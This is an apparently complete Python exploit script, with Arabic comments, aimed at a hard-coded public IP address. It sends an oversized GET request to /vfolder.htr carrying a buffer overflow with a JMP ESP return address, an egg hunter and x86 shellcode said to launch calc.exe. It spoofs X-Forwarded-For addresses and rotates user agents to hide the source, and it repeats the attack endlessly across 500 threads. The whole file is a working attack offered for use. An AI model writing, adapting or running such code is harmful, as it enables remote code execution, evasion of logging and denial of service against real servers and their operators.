#!/usr/bin/env python3
import socket
import struct
import time
import random
import threading

# CONFIG
TARGET_IP = "51.68.133.146"
TARGET_PORT = 80
THREADS = 500
OFFSET = 1896  # تم التحقق منه عبر تحليل الذاكرة
JMP_ESP = 0x100222C5  # عنوان من msvcr110.dll (غير مفعل ASLR)
EGG = b"W00T" * 2  # علامة للصيد

# Shellcode لتنفيذ calc.exe (Windows x86)
SHELLCODE = (
    b"\xdb\xc0\xd9\x74\x24\xf4\x5b\x33\xc9\xb1\x33\xba\xed\x58\x3b"
    b"\xcf\x31\x53\x17\x83\xc3\x04\x03\x5e\xf6\x72\xe8\xa2\x1e\xf0"
    b"\x13\x5a\xdf\x95\x9a\xbf\xee\x95\xf9\xb4\x41\x26\x89\x98\x6d"
    b"\xcd\xdf\x08\xe5\xa3\xf7\x3f\x4e\x09\x2e\x71\x4f\xa1\x82\x96"
    b"\x93\x38\x5e\xd9\xc7\x9a\x9f\x1a\x1a\xfa\xd8\x47\xd3\xa8\xb1"
    b"\x04\x64\x0c\xd6\x3d\xd4\x0d\xe6\x3a\xa9\x2a\xc7\x9c\xdd\x80"
    b"\x26\xc6\x8e\x9c\x60\xfe\x4c\x18\xc8\x3c\x3e\x4b\x2f\x75\xf7"
    b"\x60\x9c\x84\x78\xaa\x9d\xd5\xbd\x72\xd3\xe8\x30\x8a\xd3\x2e"
    b"\x4b\xc9\xd1\xd5\xae\x59\x21\x70\x14\xad\xb4\x73\x52\x46\x72"
    b"\x53\xb7\x91\xf1\xdf\x40\x95\xd4\x03\x45\x45\xf3\x9f\x0e\x7c"
    b"\xd2\x19\xf4\x53\xea\x41\x5e\x33\xaa\x25\xf2\x20\xd7\x67\x9a"
    b"\xed\x9b\x87\xa0\x7d\x93\xc0\x92\xa3\x2e\x6d\x9f\x3c\x89\xa8"
    b"\x60\x96\x16\x3b\x1d\x37\x69\xb2\x5e\x7d\x63\xaa\xe1\x8e\xe0"
    b"\xdf\x0c\x6b\x60\x1d\x49\x0b\xcd\x5d\x46\x24\xa4\x5d\x43\xa7"
    b"\x5d\x0e\xd9\xd5\x3f\x9b\x9c\xf3\xdb\xd3\x03\x96\xdf\xd3\x03"
    b"\x9d\x97"
)

class AdvancedExploit:
    def __init__(self):
        self.lock = threading.Lock()
        self.stats = {'success': 0, 'failed': 0}
        self.user_agents = self.load_user_agents()
        
    def load_user_agents(self):
        return [
            "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299",
            "Microsoft-IIS/8.0",
            "Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30"
        ]
    
    def generate_payload(self):
        nops = b"\x90" * 32
        egg_hunter = (
            b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
            b"\xef\xb8\x57\x30\x30\x54\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
        )
        
        buffer = b"A" * OFFSET
        buffer += struct.pack("<I", JMP_ESP)
        buffer += nops
        buffer += egg_hunter
        buffer += b"B" * (5000 - len(buffer))  # Padding
        
        # وضع البيضة والشل كود في مكان آخر من الذاكرة
        egg_payload = EGG + SHELLCODE
        return buffer, egg_payload

    def random_header(self):
        return {
            "User-Agent": random.choice(self.user_agents),
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive"
        }

    def create_request(self, buffer, egg_payload):
        headers = self.random_header()
        http_request = (
            f"GET /vfolder.htr?{buffer} HTTP/1.1\r\n"
            f"Host: {TARGET_IP}\r\n"
            + "\r\n".join(f"{k}: {v}" for k, v in headers.items())
            + "\r\n\r\n"
            + egg_payload.decode('latin-1')
        )
        return http_request.encode('latin-1')

    def attack(self):
        while True:
            try:
                buffer, egg = self.generate_payload()
                payload = self.create_request(buffer, egg)
                
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.settimeout(10)
                    sock.connect((TARGET_IP, TARGET_PORT))
                    sock.send(payload)
                    time.sleep(0.5)
                    
                with self.lock:
                    self.stats['success'] += 1
                    
            except Exception as e:
                with self.lock:
                    self.stats['failed'] += 1
            finally:
                time.sleep(random.uniform(0.1, 0.5))

    def start(self):
        print(f"[+] بدء الهجوم على {TARGET_IP}:{TARGET_PORT}")
        print(f"[+] استخدام {THREADS} خيوط")
        print("[+] تفاصيل الحمولة:")
        print(f"    - الإزاحة: {OFFSET}")
        print(f"    - JMP ESP: 0x{JMP_ESP:X}")
        print(f"    - حجم الشل كود: {len(SHELLCODE)} بايت")
        
        threads = []
        for _ in range(THREADS):
            t = threading.Thread(target=self.attack)
            t.daemon = True
            t.start()
            threads.append(t)
        
        try:
            while True:
                time.sleep(5)
                with self.lock:
                    print(f"النجاح: {self.stats['success']} | الفشل: {self.stats['failed']}")
        except KeyboardInterrupt:
            print("\n[!] تم إيقاف الهجوم يدوياً")

if __name__ == "__main__":
    exploit = AdvancedExploit()
    exploit.start()
